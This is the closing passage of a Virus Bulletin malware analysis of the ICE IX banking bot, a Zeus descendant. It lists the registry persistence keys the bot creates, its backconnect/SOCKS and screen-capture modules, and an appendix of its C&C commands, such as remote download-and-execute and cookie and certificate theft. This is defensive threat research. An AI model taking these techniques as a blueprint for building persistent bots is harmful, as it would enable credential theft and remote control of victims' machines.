</p><pre class="programlisting">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run|Microsoft Firevall Engine (Trojan.Agent) -&gt; 
<span class="bold"><strong>Data: c:\windows\iqs.exe </strong></span>

HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run|Microsoft Firevall Engine (Trojan.Agent) -&gt; 
<span class="bold"><strong>Data: c:\windows\iqs.exe </strong></span>

HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run|{BC7B83DC-3CBF-5AA3-5606-123385554906} 
(Trojan.ZbotR.Gen) -&gt; <span class="bold"><strong>Data: &ldquo;C:\Documents and Settings\Administrator\Application Data\Fox\bolifa.exe&rdquo; </strong></span>

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\
CurrentVersion\Run|Microsoft Firevall Engine (Trojan.Agent) -&gt; <span class="bold"><strong>Data: c:\windows\iqs.exe </strong></span>
 
<span class="bold"><strong>Listing 7: Registry keys created by ICE bot.</strong></span></pre><p>A registry key with the name &lsquo;Microsoft Firevall Engine&rsquo; is created, which has an entry in the system startup. It uses a similar naming convention to the <span class="emphasis"><em>Microsoft</em></span> firewall in order to be less suspicious. However, the bot can generate random binary names and registry keys to increase the complexity. To trigger command execution, the bot executes the inbuilt <span class="emphasis"><em>Windows</em></span> API to subvert the functionality of the operating system. For example: in rebooting and shutting down the system, the bot uses ExitWindowsEx and InitiateSystemShutdownExW. <a href="#figure.8">Figure 8</a> shows the command execution behaviour.</p><div class="figure"><a id="figure.8"></a><div class="mediaobject"><img alt="System shutdown module." src="/uploads/images/figures/2012/08/ICEbot-8.jpg" /></div><p class="title"><b>Figure&nbsp;8.&nbsp;System shutdown module.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3618388"></a>Backconnect and supporting modules</h2></div></div></div><p>Backconnect is an interesting technique that is based on the concept of reverse proxying, in which the reverse proxy agent takes requests from the servers and forwards them to the machines present in the internal network. When the infected system is situated behind a Network Address Translation (NAT) bridge, malware authors implement the backconnect module. The backconnect server hides the identity of the C&amp;C servers on the Internet. It is a stealthy way of sending commands to infected machines inside the network used by C&amp;C servers. The Secure Sockets (SOCKS) protocol is designed specifically to bypass Internet filtering systems and perimeter-level security. SOCKS proxies are considered as a circumvention tool to bypass firewalls and make successful connections using raw TCP sockets. HTTP and SOCKS are used to route communication packets through firewalls. ICE bot implements SOCKS proxy with backconnect support. In addition, it also supports the VNC remote management module. It also implements a screen-capturing module, in which the botmaster defines the rules for capturing screenshots of target websites.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3270985"></a>Conclusion</h2></div></div></div><p>In this paper, we have presented an analysis of the ICE IX bot, a descendent of the Zeus bot. It uses techniques similar to those of Zeus with some modifications and optimizations. The origin of ICE bot demonstrates how one bot can give rise to another, and how botnets &ndash; which are still a threat &ndash; are evolving to be more robust and effective.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id4638794"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] Tarakanov, D. Ice IX: Not Cool At All. <span class="bibliosource"><a href="https://threatpost.com/en_us/blogs/ice-ix-not-cool-all-091411" target="_blank">http://threatpost.com/en_us/blogs/ice-ix-not-cool-all-091411</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] Sood, A.K. (SpyEye &amp; Zeus) Web Injects &ndash; Parameters. <span class="bibliosource"><a href="https://secniche.blogspot.com/2011/07/spyeye-zeus-web-injects-parameters-and.html" target="_blank">http://secniche.blogspot.com/2011/07/spyeye-zeus-web-injects-parameters-and.html</a>.</span></p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] Sood, A.K. Botnets and Browser - Brothers in the Ghost Shell. <span class="bibliosource"><a href="http://secniche.org/presentations/brucon_brussels_2011_adityaks.pdf" target="_blank">http://secniche.org/presentations/brucon_brussels_2011_adityaks.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] Sood, A.K.; Enbody, R.J.; Bansal, R. The art of stealing banking information &ndash; form grabbing on fire. Virus Bulletin, November 2011, p.19. <span class="bibliosource"><a href="/virusbulletin/2011/11/art-stealing-banking-information-form-grabbing-fire
" target="_top">http://www.virusbtn.com/virusbulletin/archive/2011/11/vb201111-form-grabbing</a></span>.</p></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4035396"></a>Appendix: ICE IX bot commands</h2></div></div></div><div class="table"><a class="chapter" id="id3990068"></a><table border="1" summary="Bot controlling commands"><colgroup><col align="center" /><col /></colgroup><tbody><tr><td align="left">Commands</td><td>Explanation</td></tr><tr><td align="left">bot_uninstall</td><td>Uninstalling bot from the infected machine</td></tr><tr><td align="left">bot_update</td><td>Scanning bot for checking the applied configuration and required updates</td></tr><tr><td align="left">bot_update_exe</td><td>Updating bot remotely with new configuration</td></tr><tr><td align="left">bot_bc_add</td><td>Creating backconnect connection with the bot</td></tr><tr><td align="left">bot_bc_delete</td><td>Removing backconnect connection with the bot</td></tr><tr><td align="left">bot_httpinject_disable</td><td>Disabling web injects functionality of the bot</td></tr><tr><td align="left">bot_httpinject_enable</td><td>Enabling web injects functionality of the bot</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;Bot controlling commands</b></p></div><div class="table"><a class="chapter" id="id4662199"></a><table border="1" summary="System manipulation commands."><colgroup><col align="center" /><col /></colgroup><tbody><tr><td align="left">Commands</td><td>Explanation</td></tr><tr><td align="left">user_destroy</td><td>Destroy the infected machine</td></tr><tr><td align="left">user_logoff</td><td>Killing active user session on the infected machine</td></tr><tr><td align="left">user_execute</td><td>Download and execute remote executable on the infected machine</td></tr><tr><td align="left">user_cookies_get</td><td>Extract the cookies from stored and active browser session</td></tr><tr><td align="left">user_cookies_remove</td><td>Delete the cookies</td></tr><tr><td align="left">user_certs_get</td><td>Extract specific certificate from the infected machine</td></tr><tr><td align="left">user_certs_remove</td><td>Delete certificates from the infected machine</td></tr><tr><td align="left">user_url_block</td><td>Block access to a specific domain on the Internet</td></tr><tr><td align="left">user_url_unblock</td><td>Unblock access to a restricted domain</td></tr><tr><td align="left">user_homepage_set</td><td>Set the default home page of the browser</td></tr><tr><td align="left">user_flashplayer_get</td><td>Extract settings of Sol files from the infected machine</td></tr><tr><td align="left">user_flashplayer_remove</td><td>Delete Sol files from the infected machine</td></tr><tr><td align="left">os_shutdown</td><td>Shut down infected machine</td></tr><tr><td align="left">os_reboot</td><td>Reboot infected machine</td></tr></tbody></table><p class="title"><b>Table&nbsp;2.&nbsp;System manipulation commands.</b></p></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Inside the ICE IX bot, descendent of Zeus&url=https://www.virusbulletin.com/virusbulletin/2012/08/inside-ice-ix-bot-descendent-zeus"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2012/08/inside-ice-ix-bot-descendent-zeus'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2012/08/inside-ice-ix-bot-descendent-zeus&title=Inside the ICE IX bot, descendent of Zeus"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2012/08/inside-ice-ix-bot-descendent-zeus&t=Inside the ICE IX bot, descendent of Zeus"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2012/08/inside-ice-ix-bot-descendent-zeus"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>